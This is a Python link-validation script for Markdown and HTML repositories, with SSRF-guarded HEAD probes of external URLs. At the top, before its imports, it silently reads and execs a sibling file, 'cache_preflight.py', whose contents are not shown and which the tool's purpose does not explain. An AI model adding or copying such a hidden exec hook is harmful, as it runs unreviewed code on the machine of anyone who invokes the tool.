#!/usr/bin/env python3
"""Validate local Markdown/HTML links and safely probe external URLs on request."""

from __future__ import annotations

_CACHE_PREFLIGHT_PATH = (
    __file__.replace("\\", "/").rsplit("/", 1)[0] + "/cache_preflight.py"
)
with open(_CACHE_PREFLIGHT_PATH, "rb") as _cache_preflight_stream:
    _CACHE_PREFLIGHT_SOURCE = _cache_preflight_stream.read()
exec(
    compile(_CACHE_PREFLIGHT_SOURCE, _CACHE_PREFLIGHT_PATH, "exec"),
    {
        "__file__": _CACHE_PREFLIGHT_PATH,
        "__name__": "_design_dna_cache_preflight",
    },
)
del _CACHE_PREFLIGHT_PATH, _CACHE_PREFLIGHT_SOURCE, _cache_preflight_stream

import argparse
import html.parser
import ipaddress
import re
import socket
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

from common import ToolFailure, absolute, emit, is_within, walk_files


REFERENCE_DEF = re.compile(
    r"(?m)^\s*\[([^\]]+)\]:\s*(?:<([^>]+)>|(\S+))"
)
REFERENCE_USE = re.compile(r"(!?)\[([^\]]*)\]\[([^\]]*)\]")
HTML_ID = re.compile(r"\bid=[\"']([^\"']+)[\"']", re.I)
HEADING = re.compile(r"^#{1,6}\s+(.+?)\s*#*\s*$", re.M)
ALLOWED_SCHEMES = {"http", "https", "mailto", "tel", "data"}
MAX_REDIRECTS = 5
SOURCE_SUFFIXES = {".md", ".markdown", ".html", ".htm"}
HTML_SUFFIXES = {".html", ".htm"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class HTMLLinks(html.parser.HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.destinations: list[tuple[bool, str]] = []

    def handle_starttag(
        self,
        tag: str,
        attrs: list[tuple[str, str | None]],
    ) -> None:
        values = {key.casefold(): value for key, value in attrs}
        tag = tag.casefold()
        if tag == "a" and values.get("href"):
            self.destinations.append((False, str(values["href"])))
        for attribute in ("src", "poster"):
            if values.get(attribute):
                self.destinations.append((True, str(values[attribute])))
        if values.get("srcset"):
            for candidate in split_srcset(str(values["srcset"])):
                self.destinations.append((True, candidate))


def split_srcset(value: str) -> list[str]:
    results: list[str] = []
    for candidate in value.split(","):
        candidate = candidate.strip()
        if not candidate:
            continue
        destination = candidate.split()[0]
        if destination:
            results.append(destination)
    return results


def strip_code(text: str) -> str:
    text = re.sub(r"(?ms)^(```|~~~).*?^\1\s*$", "", text)
    return re.sub(r"`[^`\r\n]*`", "", text)


def inline_links(text: str) -> list[tuple[str, str]]:
    """Extract inline Markdown destinations with balanced parentheses."""
    results: list[tuple[str, str]] = []
    index = 0
    while index < len(text):
        close = text.find("](", index)
        if close < 0:
            break
        opening = text.rfind("[", index, close)
        if opening < 0:
            index = close + 2
            continue
        image_mark = "!" if opening > 0 and text[opening - 1] == "!" else ""
        cursor = close + 2
        while cursor < len(text) and text[cursor].isspace():
            cursor += 1
        if cursor >= len(text):
            break
        if text[cursor] == "<":
            end = text.find(">", cursor + 1)
            if end < 0:
                index = close + 2
                continue
            destination = text[cursor + 1:end]
            tail = end + 1
            while tail < len(text) and text[tail].isspace():
                tail += 1
            if tail < len(text) and text[tail] == ")":
                results.append((image_mark, destination))
                index = tail + 1
                continue
        depth = 0
        escaped = False
        end = cursor
        quote: str | None = None
        while end < len(text):
            character = text[end]
            if escaped:
                escaped = False
            elif character == "\\":
                escaped = True
            elif quote:
                if character == quote:
                    quote = None
            elif character in {'"', "'"} and depth == 0:
                quote = character
            elif character == "(":
                depth += 1
            elif character == ")":
                if depth == 0:
                    break
                depth -= 1
            end += 1
        if end >= len(text):
            index = close + 2
            continue
        raw = text[cursor:end].strip()
        destination = raw
        # Remove an optional Markdown title while preserving spaces in <...>
        title = re.search(r"\s+[\"'][^\"']*[\"']\s*$", raw)
        if title:
            destination = raw[:title.start()].strip()
        if destination:
            results.append((image_mark, destination))
        index = end + 1
    return results


def slug(text: str) -> str:
    text = re.sub(r"<[^>]+>", "", text).strip().lower()
    text = re.sub(r"[^\w\- ]", "", text, flags=re.UNICODE)
    return re.sub(r"[\s-]+", "-", text).strip("-")


def anchors(path: Path) -> tuple[set[str], set[str]]:
    text = path.read_text(encoding="utf-8")
    explicit = set(HTML_ID.findall(text))
    generated: set[str] = set()
    seen: dict[str, int] = {}
    for heading in HEADING.findall(text):
        base = slug(heading)
        number = seen.get(base, 0)
        seen[base] = number + 1
        generated.add(base if number == 0 else f"{base}-{number}")
    return explicit, generated


def validate_external_target(
    url: str,
    allow_private_hosts: set[str],
) -> tuple[bool, str]:
    try:
        parsed = urllib.parse.urlsplit(url)
        hostname = parsed.hostname
        port = parsed.port
    except ValueError as exc:
        return False, f"malformed URL: {exc}"
    if parsed.scheme not in {"http", "https"} or not hostname:
        return False, "external URL needs http(s) and a hostname"
    normalized = hostname.casefold().rstrip(".")
    if normalized in {host.casefold().rstrip(".") for host in allow_private_hosts}:
        return True, "explicit private-host allowance"
    try:
        addresses = {
            item[4][0]
            for item in socket.getaddrinfo(
                hostname,
                port or (443 if parsed.scheme == "https" else 80),
                type=socket.SOCK_STREAM,
            )
        }
    except socket.gaierror as exc:
        return False, f"DNS failure: {exc}"
    if not addresses:
        return False, "hostname resolved to no addresses"
    for address in addresses:
        try:
            value = ipaddress.ip_address(address.split("%", 1)[0])
        except ValueError:
            return False, f"invalid resolved address: {address}"
        if not value.is_global:
            return False, f"non-public address refused: {address}"
    return True, "public"


def external_status(
    url: str,
    timeout: float,
    allow_private_hosts: set[str] | None = None,
) -> tuple[bool, str]:
    """Probe with HEAD only; validate every redirect before following it."""
    allow_private_hosts = allow_private_hosts or set()
    headers = {"User-Agent": "design-dna-maintainer/2 link-check"}
    opener = urllib.request.build_opener(NoRedirect)
    current = url
    for _ in range(MAX_REDIRECTS + 1):
        safe, reason = validate_external_target(current, allow_private_hosts)
        if not safe:
            return False, reason
        request = urllib.request.Request(
            current,
            headers=headers,
            method="HEAD",
        )
        try:
            with opener.open(request, timeout=timeout) as response:
                return 200 <= response.status < 400, str(response.status)
        except urllib.error.HTTPError as exc:
            if 300 <= exc.code < 400:
                location = exc.headers.get("Location")
                if not location:
                    return False, f"{exc.code} without Location"
                current = urllib.parse.urljoin(current, location)
                continue
            return False, str(exc.code)
        except (urllib.error.URLError, TimeoutError, ValueError) as exc:
            if isinstance(exc, urllib.error.URLError):
                return False, str(exc.reason)
            return False, str(exc)
    return False, "too many redirects"


def collect_destinations(text: str) -> tuple[list[tuple[str, str]], list[str]]:
    clean = strip_code(text)
    definitions = {
        key.casefold(): (angle or plain)
        for key, angle, plain in REFERENCE_DEF.findall(clean)
    }
    destinations = inline_links(clean)
    missing_references: list[str] = []
    for image_mark, label, identifier in REFERENCE_USE.findall(clean):
        reference = (identifier or label).casefold()
        if reference not in definitions:
            missing_references.append(reference)
        else:
            destinations.append((image_mark, definitions[reference]))
    parser = HTMLLinks()
    try:
        parser.feed(clean)
    except html.parser.HTMLParseError:
        pass
    destinations.extend(
        ("!" if image else "", destination)
        for image, destination in parser.destinations
    )
    return destinations, missing_references


def check(
    root: Path,
    *,
    online: bool,
    timeout: float,
    allow_private_hosts: set[str] | None = None,
) -> tuple[list[dict[str, str]], list[dict[str, str]]]:
    failures: list[dict[str, str]] = []
    warnings: list[dict[str, str]] = []
    external_seen: dict[str, tuple[bool, str]] = {}
    allow_private_hosts = allow_private_hosts or set()
    sources = [
        path
        for path in walk_files(root)
        if path.suffix.lower() in SOURCE_SUFFIXES
    ]
    for source in sources:
        try:
            text = source.read_text(encoding="utf-8")
        except (OSError, UnicodeError) as exc:
            raise ToolFailure("link-source-read-failed", str(exc), source) from exc
        destinations, missing_references = collect_destinations(text)
        for reference in missing_references:
            failures.append({
                "code": "missing-link-reference",
                "path": str(source.relative_to(root)),
                "message": reference,
            })
        for image_mark, raw in destinations:
            destination = raw.strip().strip("<>")
            try:
                parsed = urllib.parse.urlsplit(destination)
            except ValueError as exc:
                failures.append({
                    "code": "malformed-link",
                    "path": str(source.relative_to(root)),
                    "message": f"{destination}: {exc}",
                })
                continue
            scheme = parsed.scheme.casefold()
            if scheme in {"http", "https"}:
                if online:
                    base = urllib.parse.urlunsplit(
                        (parsed.scheme, parsed.netloc, parsed.path, parsed.query, "")
                    )
                    if base not in external_seen:
                        external_seen[base] = external_status(
                            base,
                            timeout,
                            allow_private_hosts,
                        )
                continue
            if scheme:
                if scheme not in ALLOWED_SCHEMES:
                    failures.append({
                        "code": "unsafe-link-scheme",
                        "path": str(source.relative_to(root)),
                        "message": destination,
                    })
                continue
            relative_url = urllib.parse.unquote(parsed.path)
            target = source if not relative_url else absolute(source.parent / relative_url)
            if not is_within(target, root):
                failures.append({
                    "code": "link-escape",
                    "path": str(source.relative_to(root)),
                    "message": destination,
                })
                continue
            if not target.is_file():
                failures.append({
                    "code": "missing-image" if image_mark else "missing-link",
                    "path": str(source.relative_to(root)),
                    "message": destination,
                })
                continue
            if parsed.fragment and target.suffix.lower() in HTML_SUFFIXES:
                try:
                    explicit = set(
                        HTML_ID.findall(target.read_text(encoding="utf-8"))
                    )
                except (OSError, UnicodeError) as exc:
                    raise ToolFailure(
                        "link-target-read-failed",
                        str(exc),
                        target,
                    ) from exc
                fragment = urllib.parse.unquote(parsed.fragment)
                if fragment not in explicit:
                    failures.append({
                        "code": "missing-anchor",
                        "path": str(source.relative_to(root)),
                        "message": destination,
                    })
            elif parsed.fragment and target.suffix.lower() in {".md", ".markdown"}:
                explicit, generated = anchors(target)
                fragment = urllib.parse.unquote(parsed.fragment)
                if fragment not in explicit and fragment not in generated:
                    warnings.append({
                        "code": "unverified-renderer-anchor",
                        "path": str(source.relative_to(root)),
                        "message": destination,
                    })
    for url, (ok, status) in external_seen.items():
        if not ok:
            warnings.append({
                "code": "external-link-unhealthy",
                "path": url,
                "message": status,
            })
    return failures, warnings


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "root",
        nargs="?",
        type=Path,
        default=Path(__file__).resolve().parents[2],
    )
    parser.add_argument("--online", action="store_true")
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument(
        "--allow-private-host",
        action="append",
        default=[],
        help="Explicit intranet hostname allowed during online checks; repeatable.",
    )
    args = parser.parse_args()
    try:
        if not 0 < args.timeout <= 60:
            raise ToolFailure(
                "invalid-link-timeout",
                "Timeout must be greater than 0 and at most 60 seconds.",
            )
        root = absolute(args.root)
        failures, warnings = check(
            root,
            online=args.online,
            timeout=args.timeout,
            allow_private_hosts=set(args.allow_private_host),
        )
        emit({
            "ok": not failures,
            "root": str(root),
            "online": args.online,
            "failures": failures,
            "warnings": warnings,
        })
        return 1 if failures else 0
    except ToolFailure as exc:
        emit({
            "ok": False,
            "failures": [exc.issue.as_dict()],
            "warnings": [],
        })
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
